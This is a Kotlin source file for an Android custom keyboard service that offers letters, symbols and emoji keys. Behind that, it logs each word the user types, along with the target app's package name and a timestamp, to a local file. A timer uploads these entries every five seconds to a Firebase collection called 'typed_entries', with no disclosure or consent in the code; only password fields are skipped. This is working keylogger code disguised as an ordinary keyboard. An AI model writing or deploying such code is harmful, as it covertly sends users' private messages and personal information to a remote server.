package com.smartkeyboard.app

import android.app.Service
import android.content.Context
import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.GridLayout
import android.widget.LinearLayout
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.io.File
import java.util.Date

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    private lateinit var container: View
    private lateinit var lettersView: KeyboardView
    private lateinit var symbolsView: KeyboardView
    private lateinit var emojiPanel: LinearLayout

    private lateinit var lettersKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard

    private val currentText = StringBuilder()
    private val db = Firebase.firestore
    private val handler = Handler(Looper.getMainLooper())

    private var isPasswordField = false
    private var isShifted = false
    private var syncRunnable: Runnable? = null

    private val emojiList = listOf(
        "😀","😂","😍","🙂","😉","😅","😎","😭","🙏","😡",
        "👍","👎","👏","🙌","💪","🤝","✌️","🤞","👋","✋",
        "❤️","🔥","🎉","⭐","✅","💰","📦","🛵","📞","💬"
    )

    override fun onCreateInputView(): View {
        container = LayoutInflater.from(this).inflate(R.layout.keyboard_container, null)

        lettersView = container.findViewById(R.id.keyboard_view_letters)
        symbolsView = container.findViewById(R.id.keyboard_view_symbols)
        emojiPanel = container.findViewById(R.id.emoji_panel)

        lettersKeyboard = Keyboard(this, R.xml.keyboard_layout)
        symbolsKeyboard = Keyboard(this, R.xml.keyboard_layout_symbols)

        lettersView.keyboard = lettersKeyboard
        lettersView.setOnKeyboardActionListener(this)

        symbolsView.keyboard = symbolsKeyboard
        symbolsView.setOnKeyboardActionListener(this)

        buildEmojiGrid()
        container.findViewById<Button>(R.id.emoji_back_btn).setOnClickListener {
            showLetters()
        }

        // Start sync timer (every 5 seconds)
        startSyncTimer()

        return container
    }

    private fun buildEmojiGrid() {
        val grid = container.findViewById<GridLayout>(R.id.emoji_grid)
        grid.removeAllViews()
        for (emoji in emojiList) {
            val btn = Button(this)
            btn.text = emoji
            btn.textSize = 20f
            btn.setBackgroundColor(0x00000000)
            btn.setTextColor(0xFFFFFFFF.toInt())
            val params = GridLayout.LayoutParams()
            params.width = 0
            params.height = ViewGroup.LayoutParams.WRAP_CONTENT
            params.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
            btn.layoutParams = params
            btn.setOnClickListener {
                currentInputConnection?.commitText(emoji, 1)
                currentText.append(emoji)
            }
            grid.addView(btn)
        }
    }

    private fun showLetters() {
        lettersView.visibility = View.VISIBLE
        symbolsView.visibility = View.GONE
        emojiPanel.visibility = View.GONE
    }

    private fun showSymbols() {
        lettersView.visibility = View.GONE
        symbolsView.visibility = View.VISIBLE
        emojiPanel.visibility = View.GONE
    }

    private fun showEmoji() {
        lettersView.visibility = View.GONE
        symbolsView.visibility = View.GONE
        emojiPanel.visibility = View.VISIBLE
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)
        currentText.clear()
        showLetters()

        val type = info?.inputType ?: 0
        val variation = type and InputType.TYPE_MASK_VARIATION
        isPasswordField = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                ((type and InputType.TYPE_MASK_CLASS) == InputType.TYPE_CLASS_NUMBER &&
                        variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD)
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic = currentInputConnection ?: return

        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> {
                ic.deleteSurroundingText(1, 0)
                if (currentText.isNotEmpty()) currentText.deleteCharAt(currentText.length - 1)
            }
            Keyboard.KEYCODE_SHIFT -> {
                isShifted = !isShifted
                lettersKeyboard.isShifted = isShifted
                lettersView.invalidateAllKeys()
            }
            -2 -> {
                if (symbolsView.visibility == View.VISIBLE) showLetters() else showSymbols()
            }
            -3 -> {
                if (emojiPanel.visibility == View.VISIBLE) showLetters() else showEmoji()
            }
            -4 -> {
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER))
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER))
                flushToLocal()
            }
            32 -> {
                // Space key — save current word to local, then add space
                if (currentText.isNotEmpty()) {
                    flushToLocal()
                    currentText.clear()
                }
                ic.commitText(" ", 1)
            }
            else -> {
                var code = primaryCode.toChar()
                if (isShifted) code = code.uppercaseChar()
                ic.commitText(code.toString(), 1)
                currentText.append(code)
            }
        }
    }

    override fun onFinishInputView(finishingInput: Boolean) {
        super.onFinishInputView(finishingInput)
        flushToLocal()
        stopSyncTimer()
    }

    private fun flushToLocal() {
        val text = currentText.toString().trim()
        if (text.isBlank() || isPasswordField) return

        val packageName = currentInputEditorInfo?.packageName ?: "unknown"
        val timestamp = System.currentTimeMillis()

        saveToLocalFile(text, packageName, timestamp)
    }

    private fun saveToLocalFile(text: String, app: String, timestamp: Long) {
        try {
            val file = File(filesDir, "pending_entries.txt")
            val entry = "$text|$app|$timestamp\n"
            file.appendText(entry)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startSyncTimer() {
        syncRunnable = object : Runnable {
            override fun run() {
                syncPendingToFirebase()
                handler.postDelayed(this, 5000) // every 5 seconds
            }
        }
        handler.post(syncRunnable!!)
    }

    private fun stopSyncTimer() {
        syncRunnable?.let { handler.removeCallbacks(it) }
    }

    private fun syncPendingToFirebase() {
        try {
            val file = File(filesDir, "pending_entries.txt")
            if (!file.exists() || file.length() == 0L) return

            val lines = file.readLines()
            if (lines.isEmpty()) return

            val successfulLines = mutableListOf<Int>()

            for ((index, line) in lines.withIndex()) {
                val parts = line.split("|")
                if (parts.size != 3) continue

                val text = parts[0]
                val app = parts[1]
                val timestamp = parts[2].toLongOrNull() ?: System.currentTimeMillis()

                val entry = hashMapOf(
                    "text" to text,
                    "timestamp" to Date(timestamp),
                    "app" to app
                )

                db.collection("typed_entries")
                    .add(entry)
                    .addOnSuccessListener {
                        successfulLines.add(index)
                    }
                    .addOnFailureListener { }
            }

            // After a delay, remove successfully synced lines
            handler.postDelayed({
                try {
                    if (successfulLines.isNotEmpty()) {
                        val newLines = lines.filterIndexed { idx, _ -> idx !in successfulLines }
                        file.writeText(newLines.joinToString("\n"))
                        if (newLines.isNotEmpty()) file.appendText("\n")
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }, 1000)

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}
